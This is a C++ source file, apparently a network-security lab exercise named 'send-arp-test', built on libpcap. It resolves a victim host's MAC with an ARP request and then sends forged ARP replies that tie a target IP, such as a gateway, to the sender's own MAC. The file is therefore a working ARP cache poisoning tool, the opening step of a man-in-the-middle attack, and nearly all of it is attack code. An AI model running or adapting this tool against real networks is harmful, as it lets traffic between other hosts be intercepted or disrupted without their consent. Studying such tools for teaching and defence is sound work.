#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "modules.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

struct SenderMac {
    std::string macAddress;
    bool found = false;
    pcap_t* handle;
};

void usage() {
    printf("syntax: send-arp-test <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
}

void arp_reply_handler(u_char* user, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
    SenderMac* userData = reinterpret_cast<SenderMac*>(user);
    struct ether_header* eth_header = (struct ether_header*) packet;

    if (ntohs(eth_header->ether_type) == ETHERTYPE_ARP) {
        struct ether_arp* arp_header = (struct ether_arp*)(packet + sizeof(struct ether_header));

        if (ntohs(arp_header->ea_hdr.ar_op) == ARPOP_REPLY) {
            Mac mac(arp_header->arp_sha);
            userData->macAddress = static_cast<std::string>(mac);
            userData->found = true;

            pcap_breakloop(userData->handle);
        }
    }
}


std::string getSMAC(pcap_t* handle, std::string my_mac, std::string my_ip, std::string target_ip) {
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ = Mac(my_mac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(my_mac);
    packet.arp_.sip_ = htonl(Ip(my_ip));
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(Ip(target_ip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    SenderMac macData;
    macData.handle = handle;
    pcap_loop(handle, -1, arp_reply_handler, reinterpret_cast<u_char*>(&macData));

    if (macData.found) {
        return macData.macAddress;
    } else {
        return "";
    }

}


void sendARP(pcap_t* handle, std::string src_mac, std::string sender_mac, std::string src_ip, std::string dst_ip) {

    EthArpPacket packet;

    packet.eth_.dmac_ = Mac(sender_mac);
    packet.eth_.smac_ = Mac(src_mac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = Mac(src_mac);
    packet.arp_.sip_ = htonl(Ip(dst_ip));
    packet.arp_.tmac_ = Mac(sender_mac);
    packet.arp_.tip_ = htonl(Ip(src_ip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }else
    {
        printf("ARP SEND==>\n");
        printf("SENDER : %s\n", src_ip.c_str());
        printf("TARGET : %s\n", dst_ip.c_str());
        printf("MY MAC : %s\n\n", src_mac.c_str());
    }

}

int main(int argc, char* argv[]) {
    if (argc < 4 | argc % 2 != 0) {
		usage();
		return -1;
	}

    Modules modules;

    char* dev = argv[1];


	char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    //pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
    }

    std::string my_mac = modules.getMACAddress(dev);
    std::string my_ip = modules.getInterfaceIP(dev);
    std::string sender_mac = getSMAC(handle, my_mac, my_ip, argv[2]);


    for(int i = 2; i < argc; i+=2)
    {
        sendARP(handle, my_mac, sender_mac, argv[i], argv[i+1]);
    }


	pcap_close(handle);
}
